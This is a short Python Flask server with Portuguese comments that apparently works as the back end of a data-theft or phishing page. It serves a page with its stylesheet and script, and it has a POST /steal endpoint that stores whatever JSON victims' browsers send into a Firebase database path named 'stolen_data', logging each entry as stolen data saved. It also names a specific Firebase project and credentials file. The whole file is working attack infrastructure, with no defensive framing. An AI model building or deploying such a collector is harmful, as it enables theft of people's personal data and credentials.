import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
import firebase_admin
from firebase_admin import credentials, db

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)

# Inicializa Firebase Admin SDK
def init_firebase():
    cred_path = os.path.join(BASE_DIR, 'ebba-39e54-firebase-adminsdk-fbsvc-9418a54cdc.json')  # Seu arquivo de credenciais
    if not os.path.exists(cred_path):
        raise FileNotFoundError(f"Arquivo {cred_path} não encontrado. Baixe do Firebase Console.")
    
    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://ebba-39e54-default-rtdb.firebaseio.com/'  # Substitua pelo seu URL
    })

# Inicializa Firebase na startup
init_firebase()

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/style.css')
def style_css():
    return send_from_directory(BASE_DIR, 'style.css')

@app.route('/script.js')
def script_js():
    return send_from_directory(BASE_DIR, 'script.js')

@app.route('/steal', methods=['POST'])
def steal_data():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"status": "error", "message": "JSON inválido ou ausente"}), 400

    data['received_at'] = datetime.now().isoformat()
    
    try:
        # Salva no Realtime Database (path: /stolen_data/{timestamp})
        ref = db.reference('stolen_data').push(data)
        print(f"🚨 DADOS ROUBADOS SALVOS NO FIREBASE: {ref.key} - {data}")
        return jsonify({"status": "success", "id": ref.key})
        
    except Exception as e:
        print(f"❌ ERRO FIREBASE: {e}")
        return jsonify({"status": "error", "message": "Erro ao salvar dados"}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)